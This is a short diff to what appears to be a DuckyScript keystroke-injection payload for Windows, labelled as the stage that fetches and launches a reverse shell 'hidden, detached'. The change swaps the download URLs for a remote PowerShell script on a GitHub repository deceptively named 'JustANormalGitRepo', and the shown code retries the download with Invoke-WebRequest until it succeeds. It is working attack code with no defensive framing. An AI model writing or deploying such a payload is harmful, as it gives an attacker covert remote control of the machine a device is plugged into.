@@ -38,7 +38,7 @@ REM --- Stage 3: fetch + launch reverse shell (hidden, detached, fallback + retr
 STRING [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 ENTER
 DELAY 500
-STRING $urls=@('https://raw.githubusercontent.com/Hug1n/admin_tools/remote_admin_tool.ps1','https://raw.githubusercontent.com/Hug1n/admin_tools/remote_admin.ps1')
+STRING $urls=@('https://raw.githubusercontent.com/reconhawklabs/JustANormalGitRepo/refs/heads/main/remote_admin.ps1','https://raw.githubusercontent.com/reconhawklabs/JustANormalGitRepo/refs/heads/main/remote_admin.ps1')
 ENTER
 DELAY 500
 STRING $code=$null; foreach($u in $urls){ try{ $code=(Invoke-WebRequest $u -UseBasicParsing).Content; if($code){ break } } catch { Start-Sleep 3 } }
